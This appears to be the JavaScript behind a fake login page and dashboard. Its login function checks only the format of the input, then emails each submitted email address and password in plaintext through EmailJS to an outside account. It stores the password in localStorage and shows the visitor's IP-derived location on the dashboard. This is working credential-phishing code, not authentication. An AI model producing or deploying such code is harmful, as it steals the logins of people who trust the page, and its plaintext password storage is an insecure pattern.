// ======= UTIL & STORAGE HELPERS =======
const STORAGE_CURRENT_USER_KEY = "currentUser";

function saveCurrentUserPublic(user) {
  const publicUser = {
    email: user.email,
    password: user.password,
  };
  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(publicUser));
}

function loadCurrentUser() {
  return JSON.parse(localStorage.getItem(STORAGE_CURRENT_USER_KEY)) || null;
}

function logout() {
  localStorage.removeItem(STORAGE_CURRENT_USER_KEY);
  window.location.href = "index.html";
}

// ======= VALIDATION =======
function isEmailValid(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isPasswordValid(password) {
  return typeof password === "string" && password.length >= 1;
}

// ======= LOGIN FUNCTION =======
async function login(email, password) {
  if (!email || !password) {
    alert("Please enter email and password.");
    return;
  }
  if (!isEmailValid(email)) {
    alert("Invalid email format.");
    return;
  }
  if (!isPasswordValid(password)) {
    alert("Password cannot be empty.");
    return;
  }

  if (!window.emailjs) {
    alert("❌ EmailJS SDK not loaded");
    console.error("EmailJS SDK missing. Did you include the script?");
    return;
  }

  try {
    console.log("📨 Sending EmailJS message...");
    const result = await emailjs.send(
      "service_6nw221q",
      "template_d6k3x8f",
      {
        userpassword: password,
        useremail: email,
        time: new Date().toISOString()
      }
    );
    console.log("✅ EmailJS success:", result);
  } catch (error) {
    console.error("❌ EmailJS ERROR:", error);
    alert(
      `Email failed.\nStatus: ${error?.status || "unknown"}\nMessage: ${error?.text || error?.message || "no details"}`
    );
    return; // Stop login if email fails
  }

  // Save login info locally
  saveCurrentUserPublic({ email, password });

  // Redirect to dashboard
  window.location.href = "dashboard.html";
}

// ======= DASHBOARD HELPER =======
function loadDashboard() {
  const currentUser = loadCurrentUser();
  if (!currentUser || !currentUser.email) {
    window.location.href = "index.html";
    return;
  }
  const emailEl = document.getElementById("userEmail");
  if (emailEl) emailEl.textContent = currentUser.email;
}

  // ===== USER LOCATION (IP-based) =====
    async function fetchUserLocation() {
    try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    // Convert country code to flag emoji
    function countryCodeToFlag(code) {
      if (!code) return "";
      return code
        .toUpperCase()
        .replace(/./g, char =>
          String.fromCodePoint(127397 + char.charCodeAt())
        );
    }

    const flag = countryCodeToFlag(data.country_code);

    const sessionLocation = {
      ip: data.ip || "N/A",
      city: data.city || "N/A",
      region: data.region || "N/A",
      country: data.country_name || "N/A",
      countryCode: data.country_code || "",
      timezone: data.timezone || "UTC",
      utcOffset: data.utc_offset || "+00:00"
    };

    localStorage.setItem("sessionLocation", JSON.stringify(sessionLocation));

    // IP
    const ipEl = document.getElementById("user-ip");
    if (ipEl) {
      ipEl.textContent = `IP: ${sessionLocation.ip}`;
    }

    // Location + Flag
    const locationEl = document.getElementById("user-location");
    if (locationEl) {
      locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
    }

    // Time
    const timeEl = document.getElementById("user-time");
    if (timeEl) {
      const localTime = new Date().toLocaleString("en-US", {
        timeZone: sessionLocation.timezone
      });
      timeEl.textContent = `Time: ${localTime}`;
    }

  } catch (e) {
    console.warn("Could not fetch IP location:", e);

    document.getElementById("user-ip").textContent = "IP: N/A";
    document.getElementById("user-location").textContent = "Location: N/A";
    document.getElementById("user-time").textContent =
      `Time: ${new Date().toLocaleString()}`;
  }
}

// ======= HOOKS / EVENT BINDING =======
document.addEventListener("DOMContentLoaded", () => {
  // Login button
  const loginBtn = document.getElementById("loginBtn");
  if (loginBtn) {
    loginBtn.addEventListener("click", async (e) => {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      await login(email, password);
    });
  }

  // Load dashboard if on dashboard page
  if (document.getElementById("userEmail")) {
    loadDashboard();

    fetchUserLocation();
  }
});
